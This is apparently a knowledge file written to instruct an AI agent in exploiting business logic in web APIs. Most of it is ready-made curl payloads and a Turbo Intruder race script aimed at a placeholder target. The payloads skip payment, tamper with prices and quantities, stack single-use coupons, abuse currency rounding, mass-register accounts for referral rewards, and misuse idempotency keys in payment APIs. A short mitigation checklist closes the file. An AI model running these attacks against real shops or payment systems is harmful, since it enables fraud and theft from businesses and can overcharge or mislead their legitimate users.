# Business Logic, Race Conditions & Idempotency Attacks — Agent Chunk 85a
> Source: PortSwigger race condition research, Balancer V2 exploit analysis, arXiv Double Dip paper, HTTP/2 single-packet technique
> Purpose: Teaches the agent to exploit business logic flaws including multi-step workflow manipulation, race conditions, and idempotency key abuse
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing API business logic, especially e-commerce, payment, and reward systems. Business logic flaws cannot be detected by automated scanners -- they require understanding of the intended workflow. Test race conditions using HTTP/2 single-packet technique for maximum reliability. Always test idempotency key handling when payment or state-changing APIs support them.

---

## 1. Multi-Step Workflow Manipulation

### Checkout Flow Bypass
```bash
# Typical checkout flow: Cart -> Shipping -> Payment -> Confirmation
# Attack: Skip payment step by directly calling confirmation endpoint

# Step 1: Add items to cart
curl -X POST https://api.target.com/api/cart/items \
  -H "Authorization: Bearer <token>" \
  -d '{"product_id": "expensive-item", "quantity": 1}'

# Step 2: Skip to order confirmation (bypass payment)
curl -X POST https://api.target.com/api/orders/confirm \
  -H "Authorization: Bearer <token>" \
  -d '{"cart_id": "cart_12345"}'

# Alternative: Modify payment status directly
curl -X PATCH https://api.target.com/api/orders/12345 \
  -H "Authorization: Bearer <token>" \
  -d '{"payment_status": "completed"}'
```

### Approval Flow Bypass
```bash
# Flow: Submit -> Manager Approve -> Director Approve -> Execute
# Attack: Self-approve by manipulating approval endpoint

curl -X POST https://api.target.com/api/requests/12345/approve \
  -H "Authorization: Bearer <requester_token>" \
  -d '{"approved": true, "approver_role": "director"}'
# Test: Can the requester approve their own request?
# Test: Can a manager approve at director level?
```

---

## 2. Price & Quantity Manipulation

### Price Manipulation Payloads
```bash
# Negative price
curl -X POST https://api.target.com/api/cart/items \
  -d '{"product_id":"item1","quantity":1,"price":-100.00}'

# Zero price
curl -X POST https://api.target.com/api/cart/items \
  -d '{"product_id":"item1","quantity":1,"price":0}'

# Floating point precision abuse
curl -X POST https://api.target.com/api/cart/items \
  -d '{"product_id":"item1","quantity":1,"price":0.001}'

# Price in different field (override server-side price)
curl -X POST https://api.target.com/api/checkout \
  -d '{"items":[{"id":"item1","unit_price":0.01,"qty":1}]}'

# String instead of number
curl -X POST https://api.target.com/api/cart/items \
  -d '{"product_id":"item1","price":"0"}'
```

### Inventory Manipulation
```bash
# Negative quantity
curl -X POST https://api.target.com/api/cart/items \
  -d '{"product_id":"item1","quantity":-5}'
# May result in credit instead of charge

# Integer overflow (32-bit signed max: 2147483647)
curl -X POST https://api.target.com/api/cart/items \
  -d '{"product_id":"item1","quantity":2147483648}'
# Overflows to negative, potentially crediting account

# Zero quantity (may bypass validation but keep discount)
curl -X POST https://api.target.com/api/cart/items \
  -d '{"product_id":"item1","quantity":0}'

# Fractional quantity
curl -X POST https://api.target.com/api/cart/items \
  -d '{"product_id":"item1","quantity":0.0001}'
```

---

## 3. Race Conditions — HTTP/2 Single-Packet Technique

### Principle
HTTP/2 multiplexes multiple requests over a single TCP connection. By sending all request frames in a single TCP packet, all requests arrive at the server simultaneously, maximizing the race window.

### Turbo Intruder Script (Burp Suite)
```python
# single-packet-attack.py for Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)

    # Queue 20 identical requests
    for i in range(20):
        engine.queue(target.req, gate='race')

    # Open gate - sends all requests in a single packet
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### Coupon Stacking Race
```bash
# Exploit: Apply the same single-use coupon multiple times
# Send concurrent requests to apply coupon before server marks it as used

# Using curl with HTTP/2 (requires --http2)
for i in $(seq 1 20); do
  curl --http2 -X POST https://api.target.com/api/cart/apply-coupon \
    -H "Authorization: Bearer <token>" \
    -d '{"coupon_code":"SAVE50"}' &
done
wait
# Multiple requests succeed before the "coupon used" flag is set
```

### Negative Total via Race
```bash
# Step 1: Add high-value item to cart
curl -X POST https://api.target.com/api/cart/items \
  -d '{"product_id":"expensive","quantity":1}'
# Cart total: $500

# Step 2: Apply coupon ($200 off) via race condition - multiple times
# If 3 applications succeed: $500 - $200 - $200 - $200 = -$100
# Server may credit $100 to account or process as refund
```

---

## 4. Currency Rounding Exploitation

### Balancer V2 — $128M Exploit (2023)
```
Attack Principle:
- Balancer's smart contract rounded token amounts during swaps
- Attacker performed thousands of tiny swaps exploiting rounding direction
- Each swap gained a fraction of a token due to rounding in attacker's favor
- Aggregated across thousands of transactions: $128M profit

API Security Relevance:
- Same rounding exploitation applies to fintech/payment APIs
- Conversion between currencies with different decimal places
- Aggregation of fractional cents across many transactions
```

### API Rounding Test
```bash
# Test currency conversion rounding
# $0.001 USD -> EUR at rate 0.92
# Correct: $0.00092 -> rounds to $0.00
# Exploitable: some systems round to $0.01

for i in $(seq 1 10000); do
  curl -s -X POST https://api.target.com/api/transfer \
    -d '{"amount":0.001,"from":"USD","to":"EUR"}' &
done
wait
# If each $0.001 rounds to $0.01 in EUR, attacker gains $0.009 * 10000 = $90
```

---

## 5. Referral & Reward Abuse

### arXiv Double Dip Attack
```
Research finding: Referral reward systems that check referral validity
at sign-up time but credit rewards asynchronously are vulnerable to
"double dip" attacks.

Attack Flow:
1. Create referral link for User A
2. Simultaneously register User B and User C using same referral link
3. Race condition: both registrations complete before reward is marked "claimed"
4. User A receives double reward
5. Scale: Automate with hundreds of concurrent sign-ups
```

```bash
# Automated referral abuse
REFERRAL_CODE="USER_A_REF_123"
for i in $(seq 1 50); do
  curl -X POST https://api.target.com/api/register \
    -d "{\"email\":\"temp${i}@mailinator.com\",\"referral\":\"$REFERRAL_CODE\"}" &
done
wait
# Check User A's reward balance
curl https://api.target.com/api/user/rewards \
  -H "Authorization: Bearer <user_a_token>"
```

---

## 6. Idempotency Key Exploitation

### Key Reuse Across Different Operations
```bash
# Idempotency-Key intended to prevent duplicate charges
# Attack: Reuse key from a small payment for a large payment

# Step 1: Make legitimate small payment
curl -X POST https://api.target.com/api/payments \
  -H "Idempotency-Key: key-12345" \
  -d '{"amount": 1.00, "currency": "USD"}'
# Response cached with key-12345

# Step 2: Attempt large payment with same key
curl -X POST https://api.target.com/api/payments \
  -H "Idempotency-Key: key-12345" \
  -d '{"amount": 10000.00, "currency": "USD"}'
# If server returns cached response from Step 1 without actually charging,
# attacker gets the large service/product for $1.00
```

### Key Prediction
```bash
# If idempotency keys are sequential or predictable:
# key-00001, key-00002, key-00003...
# Attacker can predict future keys and preempt legitimate requests

curl -X POST https://api.target.com/api/payments \
  -H "Idempotency-Key: key-00100" \
  -d '{"amount": 0.01}'
# When legitimate user tries key-00100 for $500 payment,
# they get cached $0.01 response
```

### Cross-User Key Pollution
```bash
# Test: Does the idempotency key scope include the user?
# User A sets a key:
curl -X POST https://api.target.com/api/payments \
  -H "Authorization: Bearer <user_a_token>" \
  -H "Idempotency-Key: shared-key-123" \
  -d '{"amount": 0.01}'

# User B uses same key:
curl -X POST https://api.target.com/api/payments \
  -H "Authorization: Bearer <user_b_token>" \
  -H "Idempotency-Key: shared-key-123" \
  -d '{"amount": 999.99}'
# If key is global (not per-user), User B gets User A's cached response
```

### Collision Attack
```bash
# If idempotency keys are hashed with a weak algorithm:
# MD5/CRC32 collision can map two different keys to the same cache entry
# Test by generating colliding key pairs
```

---

## 7. State Machine Bypass

```bash
# Order state machine: pending -> paid -> shipped -> delivered
# Attack: Transition directly to "delivered" or "refunded"

# Direct state manipulation
curl -X PATCH https://api.target.com/api/orders/12345 \
  -H "Authorization: Bearer <token>" \
  -d '{"status": "refunded"}'

# Reverse state transition (delivered -> pending -> cancel)
curl -X POST https://api.target.com/api/orders/12345/cancel \
  -d '{"reason": "changed mind"}'
# Item already received but order cancelled for refund

# Test all transitions
for state in pending paid processing shipped delivered cancelled refunded; do
  echo "Testing transition to: $state"
  curl -s -o /dev/null -w "%{http_code}" \
    -X PATCH https://api.target.com/api/orders/12345 \
    -d "{\"status\":\"$state\"}"
done
```

---

## 8. Mitigation Checklist
- Enforce state machine transitions server-side; reject invalid transitions
- Validate prices server-side; never trust client-submitted prices
- Use database-level locking (SELECT FOR UPDATE) for race-sensitive operations
- Scope idempotency keys to user + endpoint + method
- Use cryptographically random idempotency keys; reject predictable patterns
- Compare full request body on idempotency key reuse; reject mismatches
- Round currency calculations using banker's rounding; audit rounding direction
- Rate-limit referral redemptions per referral code
- Log and alert on unusual patterns (bulk sign-ups, rapid coupon applications)
